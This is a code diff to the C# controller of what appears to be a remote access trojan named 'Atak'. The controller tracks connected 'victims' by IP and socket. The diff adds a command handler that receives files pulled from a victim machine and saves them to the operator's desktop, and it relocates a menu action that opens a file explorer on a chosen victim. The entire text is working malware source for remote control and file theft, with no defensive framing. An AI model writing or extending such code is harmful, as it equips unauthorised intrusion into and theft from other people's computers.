@@ -12,6 +12,7 @@ using System.Net;
 using System.IO;
 using Microsoft.VisualBasic;
 using System.Text.RegularExpressions;
+using System.Threading;
 
 namespace Atak
 {
@@ -95,6 +96,18 @@ namespace Atak
                             scr.SetLength(0);
                         }
                         GC.Collect();
+                        break;
+                    case "FILEC":
+                        int len2 = Convert.ToInt32(sData[1]);
+                        string ext = sData[2];
+
+                        byte[] fileBuffer = new byte[len2 + 10];
+                        socket.Receive(fileBuffer, len2, SocketFlags.None);
+                        using (Stream file = File.OpenWrite(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + $"\\file{ext}"))
+                        {
+                            file.Write(fileBuffer, 0, fileBuffer.Length);
+                        }
+                        MessageBox.Show("Downloaded", "Atak", MessageBoxButtons.OK, MessageBoxIcon.Information);
                         break;
                     case "PPPNUM":                       
                         pNum = Convert.ToInt32(sData[1]);
@@ -260,7 +273,17 @@ namespace Atak
                 }
             }
         }
-
+        private void fileExplorerToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Victims victim in victimList)
+            {
+                if (victim.ip == VictimsListView.SelectedItems[0].Text)
+                {
+                    FileExplorer file = new FileExplorer(victim.socket);
+                    file.Show();
+                }
+            }
+        }
 
         void connect(int port)
         {
@@ -273,18 +296,6 @@ namespace Atak
         {
             Regex re = new Regex("^(http|https)://");
             return re.IsMatch(url);
-        }
-
-        private void fileExplorerToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            foreach (Victims victim in victimList)
-            {
-                if (victim.ip == VictimsListView.SelectedItems[0].Text)
-                {
-                    FileExplorer file = new FileExplorer(victim.socket);
-                    file.Show();
-                }
-            }
         }
     }
 }
